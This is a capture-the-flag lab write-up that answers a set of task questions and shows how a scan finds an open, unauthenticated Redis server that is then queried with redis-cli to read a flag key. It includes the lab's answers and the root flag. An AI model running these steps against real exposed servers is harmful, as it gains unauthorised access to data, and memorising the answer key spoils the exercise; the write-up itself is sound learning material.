# Tasks
- Which TCP port is open on the machine?
	- 6379
- Which service is running on the port that is open on the machine?
	- Redis
- What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database
	- in-memory database
- Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
	- redis-cli
- Which flag is used with the Redis command-line utility to specify the hostname?
	- -h
- Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
	- INFO
- What is the version of the Redis server being used on the target machine?
	- 5.0.7
- Which command is used to select the desired database in Redis?
	- SELECT
- How many keys are present inside the database with index 0?
	- 4
- Which command is used to obtain all the keys in a database?
	- KEYS *
- Submit root flag
	- 03e1d2b376c37ab3f5319922053953eb


# Steps
- As always, let's start off with an initial rustscan to see what's going on here.
```
rustscan --ulimit 5000 --addresses "10.129.136.187" --top -- -sC -sV
```
- We are only given one port, which is for the Redis database
```
PORT     STATE SERVICE REASON         VERSION  
6379/tcp open  redis   syn-ack ttl 63 Redis key-value store 5.0.7
```
- Therefore, we can connect to the database using the Redis CLI tool.
	- https://redis.io/docs/latest/develop/tools/cli/
- Specifically, we can use the -h to specifiy the host to connect to
```
redis-cli -h 10.129.136.187
```
- After doing so, we are thrown into the Redis console.
- We can then use the help @generic command to get an idea on what commands are available to us.
- Running INFO gives us information about the server, which helps in answering the questions above.
- We can then use the KEYS * command to dump all possible keys, in which one of them is the flag!
```
10.129.136.187:6379> KEYS *  
1) "stor"  
2) "temp"  
3) "numb"  
4) "flag"
```
- We just now need to get that key value, which we can do by using the GET command
```
GET flag
```
- We are then able to get our flag just fine!
```
10.129.136.187:6379> GET flag  
"03e1d2b376c37ab3f5319922053953eb"
```
